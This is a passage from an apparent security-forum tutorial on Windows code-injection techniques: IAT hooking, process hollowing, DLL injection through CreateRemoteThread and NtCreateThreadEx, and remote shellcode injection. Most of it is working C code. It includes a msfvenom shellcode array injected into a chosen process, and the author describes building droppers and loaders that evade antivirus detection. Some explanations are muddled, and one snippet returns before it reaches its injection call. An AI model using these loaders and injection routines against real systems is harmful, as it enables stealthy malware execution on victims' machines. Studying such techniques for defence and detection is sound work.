           |                   |                    +------------&gt;---------------------+
           | call MessageBoxA  |               IAT  |             |  ....              |
           |                   |       +-------------------+      |(kernel32!MsgBoxA)  |
           +-------------------+       |            |      |      |  ....              |
                             +----------&gt; jmp       +      |      +--------------------+
                                       |                   |      |                    |
                                       +-------------------+      +--------------------+
</code></pre>
<p>First the target program calls a WinAPI <code>MessageBoxA</code> function, the program looks up the <code>MessageBoxA</code> address in the IAT and code execution jumps to the <code>kernel32!MessageBoxA</code> address resolved in step 2 where legitimate code for displaying the <code>MessageBoxA</code> , Here’s how the IAT table works in the context of a call to a function like <code>MessageBoxA</code>:</p>
<pre><code class="lang-c">#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS))
</code></pre>
<p>The application code makes a function call to <code>MessageBoxA</code>. This call is typically made using a function or API from a Windows library, When the application code makes a function call, it does not directly call the function’s code. Instead, it looks up the address of the function in the IAT, which contains entries for various imported functions. Once the address of <code>MessageBoxA</code> is resolved in the IAT, the code execution jumps to that resolved address. In this case, the resolved address points to the legitimate <code>kernel32!MessageBoxA</code> function.</p>
<pre><code class="lang-c">size_t ptr_msgboxa = 0;
void iatHook(char *module, const char *szHook_ApiName, size_t callback, size_t &amp;apiAddr)
{
    auto dir_ImportTable = getNtHdr(module)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto impModuleList = (IMAGE_IMPORT_DESCRIPTOR *)&amp;module[dir_ImportTable.VirtualAddress];
    for (; impModuleList-&gt;Name; impModuleList++)
    {
        auto arr_callVia = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;FirstThunk];
        auto arr_apiNames = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;OriginalFirstThunk];
        for (int i = 0; arr_apiNames[i].u1.Function; i++)
        {
            auto curr_impApi = (PIMAGE_IMPORT_BY_NAME)&amp;module[arr_apiNames[i].u1.Function];
            if (!strcmp(szHook_ApiName, (char *)curr_impApi-&gt;Name))
            {
                apiAddr = arr_callVia[i].u1.Function;
                arr_callVia[i].u1.Function = callback;
                break;
            }
        }
    }
}

int main(int argc, char **argv)
{
    void (*ptr)(UINT, LPCSTR, LPCSTR, UINT) = [](UINT hwnd, LPCSTR lpText, LPCSTR lpTitle, UINT uType) {
        printf("[hook] MessageBoxA(%i, \"%s\", \"%s\", %i)", hwnd, lpText, lpTitle, uType);
        ((UINT(*)(UINT, LPCSTR, LPCSTR, UINT))ptr_msgboxa)(hwnd, "msgbox got hooked", "alert", uType);
    };

    iatHook((char *)GetModuleHandle(NULL), "MessageBoxA", (size_t)ptr, ptr_msgboxa);
    MessageBoxA(0, "Hook Test", "title", 0);
    return 0;
}
</code></pre>
<p>So What’s Going on Here? Instead of executing the legitimate <code>kernel32!MessageBoxA</code> function, the IAT entry for <code>MessageBoxA</code> is modified to point to a replacement function (the <code>ptr</code> function in the code). As a result, when the application makes a call to <code>MessageBoxA</code>, it actually calls the replacement function, which can alter or extend the behavior of the original function call.</p>
<h1><a name="process-hollowing-5" class="anchor" href="https://0x00sec.org#process-hollowing-5"></a>Process Hollowing</h1>
<p>So, Process hollowing is a technique that begins with the creation of a new instance of a legitimate process in a suspended state, The suspended state allows the injected code to be executed within the context of this process.</p>
<p>To successfully perform process hollowing, the source image (the executable being injected into the legitimate process) must meet specific requirements and characteristics to ensure that the technique works effectively. These requirements include:</p>
<ol>
<li><strong>PE Format:</strong> The source image must be in the Portable Executable (PE) format, which is the standard executable file format on Windows. This format includes headers and sections that define the structure of the executable.</li>
<li><strong>Executable Code:</strong> The source image should contain executable code that can be run by the Windows operating system. This code is typically located within the <code>.text</code> section of the PE file.</li>
<li><strong>Address of Entry Point:</strong> The PE header of the source image must specify the address of the entry point, which is the starting point for the execution of the code. The address of the entry point is used to set the <code>EAX</code> register in the context of the suspended process.</li>
<li><strong>Sections and Data:</strong> The source image should contain necessary sections, such as the <code>.text</code> section for code and other sections for data. These sections should be properly defined in the PE header, and the data should be accessible and relevant to the code’s execution.</li>
<li><strong>Relocation Table:</strong> The source image may have a relocation table that allows it to be loaded at a different base address. If the source image lacks a relocation table, it may only work if it can be loaded at its preferred base address.</li>
</ol>
<p>Creating The Process The target process must be created in the suspended state, The code aims to create a new instance of a process in a suspended state and subsequently replace its code and data with the code and data from another executable (the source image), which includes creating a suspended process and performing memory operations to load the new image.</p>
<pre><code class="lang-c">// Create a new instance of current process in suspended state, for the new image.
if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &amp;SI, &amp;PI)) 
{
    // Allocate memory for the context.
    CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
    CTX-&gt;ContextFlags = CONTEXT_FULL; // Context is allocated

    // Retrieve the context.
    if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
    {
        pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader-&gt;OptionalHeader.ImageBase),
            NtHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

        // File Mapping
        WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, NULL);
        for (int i = 0; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++)
            WriteProcessMemory
            (
                PI.hProcess, 
                LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
                LPVOID((size_t)Image + SectionHeader[i].PointerToRawData), 
                SectionHeader[i].SizeOfRawData, 
                0
            );
    }
}
</code></pre>
<p>Alright <code>CreateProcessA</code> function is used to create a new instance of the current process (or another specified executable) in a suspended state. The <code>CREATE_SUSPENDED</code> flag is used to create the process in a suspended state, meaning its execution is paused, After creating the suspended process, memory is allocated using <code>VirtualAlloc</code> to hold the context of the suspended process. The context structure (<code>CTX</code>) is used to capture information about the process’s execution state.</p>
<p><strong>Retrieving and Updating Context</strong></p>
<ul>
<li><code>GetThreadContext</code> function is called to retrieve the context of the suspended process’s main thread (<code>PI.hThread</code>). The context is stored in the <code>CTX</code> structure.</li>
<li>The context is updated to prepare for the execution of the new code. Specifically, the <code>EAX</code> register is set to the address of the entry point of the new code, Next the code then proceeds to copy the headers (PE header) of the source image into the allocated memory within the suspended process using <code>WriteProcessMemory</code>. This is crucial for ensuring that the new image is loaded correctly, A loop iterates through the sections of the source image (<code>SectionHeader</code>) and copies the section data from the source image to corresponding memory locations within the suspended process using <code>WriteProcessMemory</code>. This step is essential to load the code and data.</li>
</ul>
<p>At this point, the process hollowing process is set up, and the new image’s code and data have been loaded into the memory of the suspended process. The code execution will continue from this point, allowing the new image to execute within the context of the suspended process.</p>
<pre><code class="lang-c">WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;pImageBase), 4, 0);
CTX-&gt;Eax = DWORD(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;
SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
ResumeThread(PI.hThread);
</code></pre>
<p>The destination address is calculated as <code>CTX-&gt;Ebx + 8</code>, and 4 bytes of data are written. This memory write operation sets the location where the process should begin execution of the new code.</p>
<p><code>CTX-&gt;Eax</code> is updated with the address of the new code’s entry point. This effectively sets the instruction pointer (<code>EIP</code>) to the starting point of the loaded code. The entry point address is obtained from the PE header of the source image: <code>NtHeader-&gt;OptionalHeader.AddressOfEntryPoint</code>. Finally, the <code>ResumeThread</code> function is called to resume the execution of the suspended process. At this point, the process begins executing the injected code, starting from the entry point that was set, The injected code within the suspended process will now take control of the process’s execution.</p>
<pre><code class="lang-c">char CurrentFilePath[MAX_PATH + 1];
GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);
if (strstr(CurrentFilePath, "GoogleUpdate.exe")) {
MessageBoxA(0, "foo", "", 0);
return 0;

LONGLONG len = -1;
RunPortableExecutable("GoogleUpdate.exe", MapFileToMemory(CurrentFilePath, len));
return 0;
}
</code></pre>
<p>Once the application is run is used to retrieve the full path of the currently running executable (the application itself), There is a conditional check using <code>strstr</code> to examine the <code>CurrentFilePath</code>. If the file path contains “GoogleUpdate.exe,” it displays a message box with the title and the message “foo” using the <code>MessageBoxA</code> function, If the file path doesn’t match the condition, the code continues to execute. It proceeds to call the <code>RunPortableExecutable</code> function, The target process for process hollowing is specified as “GoogleUpdate.exe.” It passes the source image, Otherwise, it proceeds with the process hollowing technique to inject and run code from another executable. This is a simple example.</p>
<h1><a name="dll-injection-techniques-6" class="anchor" href="https://0x00sec.org#dll-injection-techniques-6"></a>DLL injection Techniques</h1>
<p>DLL injection is the act of introducing code into a currently executing process. Typically, the code we introduce takes the form of a dynamic link library (DLL) since DLLs are designed to be loaded as needed during runtime. However, this doesn’t preclude us from injecting assembly code or other forms of code (such as executables or handwritten code). It’s crucial to bear in mind that you must possess the necessary level of privileges on the system to engage in memory manipulation within other programs.</p>
<p>The Windows API provides a range of functions that enable us to attach to and manipulate other programs, primarily for debugging purposes. We will make use of these methods to execute DLL injection. I’ve divided the DLL injection process into four distinct steps:</p>
<ol>
<li><strong>Attach</strong> to the process</li>
<li><strong>Allocate</strong> Memory within the process</li>
<li><strong>Copy</strong> the DLL or the DLL Path into the processes memory and determine appropriate memory addresses</li>
<li>Instruct the process to <strong>Execute</strong> your DLL</li>
</ol>
<p>Each one of these steps can be accomplished through the use of one or more programming techniques which are summarized in the below graphic. It’s important to understand the details/options present for each technique as they all have their positives and negatives.</p>
<ul>
<li><strong>LoadLibrary:</strong> Using the <code>LoadLibrary</code> function to load a DLL into a process.</li>
<li><strong>CreateRemoteThread:</strong> Injecting a DLL using the <code>CreateRemoteThread</code> function.</li>
<li><strong>SetWindowsHookEx:</strong> Using Windows hooks to inject code into other processes.</li>
<li><strong>Process Hollowing:</strong> Replacing the code and data of a legitimate process with a malicious DLL.</li>
</ul>
<p>We have a couple of options (e.g. <code>CreateRemoteThread()</code>,<code>NtCreateThreadEx()</code>, etc…) when instructing the target process to launch our DLL. Unfortunately we can’t just provide the name of our DLL to these functions, instead we have to provide a memory address to start execution at. We perform the <strong>Allocate</strong> and <strong>Copy</strong> steps to obtain space within the target process’ memory and prepare it as an execution starting point.</p>
<p>There are two popular starting points: <code>LoadLibraryA()</code> and jumping to <code>DllMain</code>.</p>
<h4><a name="loadlibrarya-7" class="anchor" href="https://0x00sec.org#loadlibrarya-7"></a><code>LoadLibraryA()</code></h4>
<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>LoadLibraryA()</code></a> is a <code>kernel32.dll</code> function used to load DLLs, executables, and other supporting libraries at run time. It takes a filename as its only parameter and magically makes everything work. This means that we just need to allocate some memory for the path to our DLL and set our execution starting point to the address of <code>LoadLibraryA()</code>, providing the memory address where the path lies as a parameter.</p>
<p>The major downside to <code>LoadLibraryA()</code> is that it registers the loaded DLL with the program and thus can be easily detected. Another slightly annoying caveat is that if a DLL has already been loaded once with <code>LoadLibraryA()</code>, it will not execute it. You can work around this issue but it’s more code.</p>
<h4><a name="jumping-to-dllmain-or-another-entry-point-8" class="anchor" href="https://0x00sec.org#jumping-to-dllmain-or-another-entry-point-8"></a>Jumping to <code>DllMain</code> (or another entry point)</h4>
<p>An alternative method to <code>LoadLibraryA()</code> is load the entire DLL into memory, then determine the offset to the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx" rel="noopener nofollow ugc">DLL’s entry point</a>. Using this method you can avoid registering the DLL with the program (stealthy) and repeatedly inject into a process.</p>
<h3><a name="attaching-to-the-process-9" class="anchor" href="https://0x00sec.org#attaching-to-the-process-9"></a>Attaching to the Process</h3>
<p>First we’ll need a <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724176%28v=vs.85%29.aspx" rel="noopener nofollow ugc">handle</a> to the process so that we can interact with it. This is done with the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684320%28v=vs.85%29.aspx" rel="noopener nofollow ugc">OpenProcess()</a> function. We’ll also need request certain <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx" rel="noopener nofollow ugc">access rights</a> in order for us to perform the tasks below. The specific access rights we request vary across Windows versions, however the following should work for most:</p>
<pre><code class="lang-c">hHandle = OpenProcess( PROCESS_CREATE_THREAD | 
                       PROCESS_QUERY_INFORMATION | 
                       PROCESS_VM_OPERATION | 
                       PROCESS_VM_WRITE | 
                       PROCESS_VM_READ, 
                       FALSE, 
                       procID );
</code></pre>
<p>Before we can inject anything into another process, we’ll need a place to put it. We’ll use the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366890%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>VirtualAllocEx()</code></a> function to do so.</p>
<p><code>VirtualAllocEx()</code> takes amount of memory to allocate as one of its parameters. If we use <code>LoadLibraryA()</code>, we’ll allocate space for the full path of the DLL and if we jump to the <code>DllMain</code>, we’ll allocate space for the DLL’s full contents.</p>
<h3><a name="dll-path-10" class="anchor" href="https://0x00sec.org#dll-path-10"></a>DLL Path</h3>
<p>Allocating space for just the DLL path slightly reduces the amount of code you’ll need to write but not by much. It also requires you to use the <code>LoadLibraryA()</code> method which has some downsides (described above). That being said, it is a very popular method.</p>
<p>Use <code>VirtualAllocEx()</code> and allocate enough memory to support a string which contains the path to the DLL:</p>
<pre><code class="lang-c">GetFullPathName(TEXT("foo.dll"), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

dllPathAddr = VirtualAllocEx(hHandle, 
                             0, 
                             strlen(dllPath), 
                             MEM_RESERVE|MEM_COMMIT, 
                             PAGE_EXECUTE_READWRITE);
</code></pre>
<h3><a name="full-dll-11" class="anchor" href="https://0x00sec.org#full-dll-11"></a>Full DLL</h3>
<p>Allocating space for the full DLL requires a little more code however it’s also much more reliable and doesn’t need to use <code>LoadLibraryA()</code>.</p>
<p>First, open a handle to the DLL with <code>CreateFileA()</code> then calculate its size with <code>GetFileSize()</code> and pass it to <code>VirtualAllocEx()</code>:</p>
<pre><code class="lang-c">
GetFullPathName(TEXT("foo.dll"), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

hFile = CreateFileA( dllPath, 
                     GENERIC_READ, 
                     0, 
                     NULL, 
                     OPEN_EXISTING, 
                     FILE_ATTRIBUTE_NORMAL, 
                     NULL );

dllFileLength = GetFileSize( hFile, 
                             NULL );

remoteDllAddr = VirtualAllocEx( hProcess, 
                                NULL, 
                                dllFileLength, 
                                MEM_RESERVE|MEM_COMMIT, 
                                PAGE_EXECUTE_READWRITE ); 

</code></pre>
<p>Now that we have space allocated in our target process, we can copy our DLL Path or the Full DLL (depending on the method you choose) into that process. We’ll use <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx" rel="noopener nofollow ugc">WriteProcessMemory()</a> to do so:</p>
<h3><a name="dll-path-12" class="anchor" href="https://0x00sec.org#dll-path-12"></a>DLL Path</h3>
<pre><code class="lang-c">
WriteProcessMemory(hHandle, 
                   dllPathAddr, 
                   dllPath, 
                   strlen(dllPath), 
                   NULL);

</code></pre>
<h3><a name="full-dll-13" class="anchor" href="https://0x00sec.org#full-dll-13"></a>Full DLL</h3>
<p>We’ll first need to read our DLL into memory before we copy it to the remote processes.</p>
<pre><code class="lang-c">
lpBuffer = HeapAlloc( GetProcessHeap(), 
                      0, 
                      dllFileLength); 

ReadFile( hFile, 
          lpBuffer, 
          dllFileLength, 
          &amp;dwBytesRead;, 
          NULL );

WriteProcessMemory( hProcess, 
                    lpRemoteLibraryBuffer, 
                    lpBuffer,  
                    dllFileLength, 
                    NULL );

</code></pre>
<h3><a name="determining-our-execution-starting-point-14" class="anchor" href="https://0x00sec.org#determining-our-execution-starting-point-14"></a>Determining our Execution Starting Point</h3>
<p>Most execution functions take a memory address to start at, so we’ll need to determine what that will be.</p>
<h3><a name="dll-path-and-loadlibrarya-15" class="anchor" href="https://0x00sec.org#dll-path-and-loadlibrarya-15"></a>DLL Path and <code>LoadLibraryA()</code></h3>
<p>We’ll search our own process memory for the starting address of <code>LoadLibraryA()</code>, then pass it to our execution function with the memory address of DLL Path as it’s parameter. To get <code>LoadLibraryA()</code>'s address, we’ll use <code>GetModuleHandle()</code> and <code>GetProcAddress()</code>:</p>
<pre><code class="lang-c">loadLibAddr = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
</code></pre>
<h3><a name="full-dll-and-jump-to-dllmain-16" class="anchor" href="https://0x00sec.org#full-dll-and-jump-to-dllmain-16"></a>Full DLL and Jump to <code>DllMain</code></h3>
<p>By copying the entire DLL into memory we can avoid registering our DLL with the process and more reliably inject. The somewhat difficult part of doing this is obtaining the entry point to our DLL when it’s loaded in memory. So we’ll use the <code>GetReflectiveLoaderOffset()</code> from it to determine our offset in our processes memory then use that offset plus the base address of the memory in the victim process we wrote our DLL to as the execution starting point. It’s important to note here that the DLL we’re injecting must complied with the appropriate includes and options so that it aligns itself with the ReflectiveDLLInjection method.</p>
<pre><code class="lang-auto">dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpWriteBuff);
</code></pre>
<h3><a name="executing-the-dll-17" class="anchor" href="https://0x00sec.org#executing-the-dll-17"></a>Executing the DLL!</h3>
<p>At this point we have our DLL in memory and we know the memory address we’d like to start execution at. All that’s really left is to tell our process to execute it. There are a couple of ways to do this.</p>
<h4><a name="createremotethread-18" class="anchor" href="https://0x00sec.org#createremotethread-18"></a><code>CreateRemoteThread()</code></h4>
<p>The <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>CreateRemoteThread()</code></a> function is probably the most widely known and used method. It’s very reliable and works most times however you may want to use another method to avoid detection or if Microsoft changes something to cause <code>CreateRemoteThread()</code> to stop working.</p>
<p>Since <code>CreateRemoteThread()</code> is a very established function, you have a greater flexibility in how you use it. For instance, you can do things like use Python to do DLL injection!</p>
<pre><code class="lang-auto">rThread = CreateRemoteThread(hTargetProcHandle, NULL, 0, lpStartExecAddr, lpExecParam, 0, NULL);
WaitForSingleObject(rThread, INFINITE);
</code></pre>
<h4><a name="ntcreatethreadex-19" class="anchor" href="https://0x00sec.org#ntcreatethreadex-19"></a><code>NtCreateThreadEx()</code></h4>
<p><code>NtCreateThreadEx()</code> is an undocumented <code>ntdll.dll</code> function. The trouble with undocumented functions is that they may disappear or change at any moment Microsoft decides. That being said, <code>NtCreateThreadEx()</code> came in good handy when Windows session separation affected <code>CreateRemoteThread()</code> DLL injection.</p>
<p><code>NtCreateThreadEx()</code> is a bit more complicated to call, we’ll need a specific structure to pass to it and another to receive data from it. I’ve detailed the implementation here:</p>
<pre><code class="lang-c">struct NtCreateThreadExBuffer {
 ULONG Size;
 ULONG Unknown1;
 ULONG Unknown2;
 PULONG Unknown3;
 ULONG Unknown4;
 ULONG Unknown5;
 ULONG Unknown6;
 PULONG Unknown7;
 ULONG Unknown8;
 }; 


typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx) (
 OUT PHANDLE hThread,
 IN ACCESS_MASK DesiredAccess,
 IN LPVOID ObjectAttributes,
 IN HANDLE ProcessHandle,
 IN LPTHREAD_START_ROUTINE lpStartAddress,
 IN LPVOID lpParameter,
 IN BOOL CreateSuspended,
 IN ULONG StackZeroBits,
 IN ULONG SizeOfStackCommit,
 IN ULONG SizeOfStackReserve,
 OUT LPVOID lpBytesBuffer
);

HANDLE bCreateRemoteThread(HANDLE hHandle, LPVOID loadLibAddr, LPVOID dllPathAddr) {

 HANDLE hRemoteThread = NULL;

 LPVOID ntCreateThreadExAddr = NULL;
 NtCreateThreadExBuffer ntbuffer;
 DWORD temp1 = 0; 
 DWORD temp2 = 0; 

 ntCreateThreadExAddr = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx");

 if( ntCreateThreadExAddr ) {
 
  ntbuffer.Size = sizeof(struct NtCreateThreadExBuffer);
  ntbuffer.Unknown1 = 0x10003;
  ntbuffer.Unknown2 = 0x8;
  ntbuffer.Unknown3 = &amp;temp2;
  ntbuffer.Unknown4 = 0;
  ntbuffer.Unknown5 = 0x10004;
  ntbuffer.Unknown6 = 4;
  ntbuffer.Unknown7 = &amp;temp1;
  ntbuffer.Unknown8 = 0;

  LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)ntCreateThreadExAddr;
  NTSTATUS status = funNtCreateThreadEx(
          &amp;hRemoteThread;,
          0x1FFFFF,
          NULL,
          hHandle,
          (LPTHREAD_START_ROUTINE)loadLibAddr,
          dllPathAddr,
          FALSE,
          NULL,
          NULL,
          NULL,
          &amp;ntbuffer;
          );
  
  if (hRemoteThread == NULL) {
   printf("\t[!] NtCreateThreadEx Failed! [%d][%08x]\n", GetLastError(), status);
   return NULL;
  } else {
   return hRemoteThread;
  }
 } else {
  printf("\n[!] Could not find NtCreateThreadEx!\n");
 }
 return NULL;

}
</code></pre>
<p>Now we can call it very much like <code>CreateRemoteThread()</code>:</p>
<pre><code class="lang-c">rThread = bCreateRemoteThread(hTargetProcHandle, lpStartExecAddr, lpExecParam);
WaitForSingleObject(rThread, INFINITE);
</code></pre>
<h1><a name="shellcode-execution-techniques-20" class="anchor" href="https://0x00sec.org#shellcode-execution-techniques-20"></a>Shellcode Execution Techniques</h1>
<p>Now, let’s dive into the world of ‘injections.’, we’ll begin with some benign code that leverages Win32 APIs. We’ll examine how it functions at a fundamental level and then transition toward more evil code, aiming to bypass these APIs and arrive at a more malicious outcome, Sounds Good So Check This out:</p>
<pre><code class="lang-c">int main(void){

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    if(!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
)){
        printf("(-) failed to create process, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("(+) process started! PID:%ld", pi.dwProcessId);
    return EXIT_SUCCESS;
}
</code></pre>
<p>What’s the purpose of this code, you may wonder? You likely have an inkling already, don’t you? Well, we’re initiating a fresh Notepad process. Let me assure you, there’s nothing shady about this code it’s entirely above board and legitimate. We’re utilizing the ‘CreateProcessW’ function, which is all about orchestrating the precise way a new process should be launched. You provide it with a set of parameters, and voilà, a new process comes to life.</p>
<pre><code class="lang-auto">BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
<p>Now, let’s take a deeper look into our coding journey. We’re not inventing something entirely new; instead, we’re refining existing code droppers and loaders for Windows targets, making them responsive to our  session commands.</p>
<p>Our goal here is to run unrestricted shellcode. Our toolkit includes familiar Windows API functions: ‘OpenProcess,’ ‘VirtualAllocEx,’ ‘WriteProcessMemory,’ and ‘CreateRemoteThread.’ Think of it as conducting an orchestra, where each function plays a specific role in enabling the shellcode to do its job. We’re in charge, and the Windows targets should be ready to follow our instructions.</p>
<h2><a name="injection-21" class="anchor" href="https://0x00sec.org#injection-21"></a>Injection</h2>
<pre><code class="lang-c">int main()
{
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    
(!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
));
  
  char shellcode[] ={
  };

    HANDLE hProcess; 
    HANDLE hThread;
    void*exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pi.dwProcessId);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL,0,0);
    CloseHandle(hProcess);
    return 0;
}
</code></pre>
<p>Alright, do you notice any differences? Bingo, there’s “shellcode.” Let me clarify; the initial code segment was straightforward, mainly focusing on creating a new process (Notepad) and adjusting its priority class. However, the code we’re dealing with now is more sinister, as it centers around remote process injection and the implementation of functions such as <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> to allocate memory within a target process and execute custom shellcode within it.</p>
<p>Nevertheless, plaintext Metasploit (msf) shellcode tends to raise red flags and is susceptible to detection by antivirus engines. In the preceding section, we delved into shellcode development, particularly emphasizing a reverse shell. Yet, this code is simpler and can be swiftly pinpointed by antivirus engines. So, let’s explore an alternative strategy how about encoding the shellcode into Read-Write-Execute (RWX) memory to initiate Notepad?</p>
<p>Alright, RWX memory implementation is fairly straightforward for our intended purpose. It involves searching a process’s private virtual memory space (the userland virtual memory space) for a memory section marked as <em>PAGE_EXECUTE_READWRITE</em>. If such a space is found, it’s returned. If not, the next search address is adjusted to the subsequent memory region (<em>BaseAddress</em> + <em>Memory Region</em>).</p>
<p>To finalize this for code execution, our shellcode must then be relocated to that discovered memory region and executed. An efficient way to achieve this is to resort  WinAPI calls, similar to what we demonstrated in the first technique. However, it’s essential to consider the drawbacks of that approach, as discussed above.</p>
<pre><code class="lang-c">int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
        
    int newPid = atoi(argv[1]);  
    printf("Injecting into pid %d\n", newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf("Invalid Handle\n");  
        exit(1);  
    }  
    LPVOID remoteBuf = VirtualAllocEx(pHandle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (!remoteBuf)  
    {  
        printf("Alloc Fail\n");  
        exit(1);  
    }  
    printf("alloc addr: %p\n", remoteBuf);  
    WriteProcessMemory(pHandle, remoteBuf, shellcode, sizeof(shellcode), NULL);  
    CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);  
    return 0;  
}
</code></pre>
<p>Let’s  try to move away from them and directly use the undocumented functions within <code>ntdll.dll</code> in this one we go level lower where we do the syscalls directly.</p>
<p>We need:</p>
<ul>
<li>NtAllocateVirtualMemory</li>
<li>NtWriteVirtualMemory</li>
<li>NtCreateThreadEx</li>
</ul>
<p>Since these APIs are not documented by Microsoft, we need to find some external references made by reverse engineers. <a href="http://undocumented.ntinternals.net/" rel="noopener nofollow ugc">http://undocumented.ntinternals.net/</a></p>
<p>Let’s look at the definition of an <code>NTAPI</code> function from the reference link:</p>
<pre><code class="lang-auto">NTSYSAPI   
NTSTATUS  
NTAPI  
  
NtAllocateVirtualMemory(  
  
  
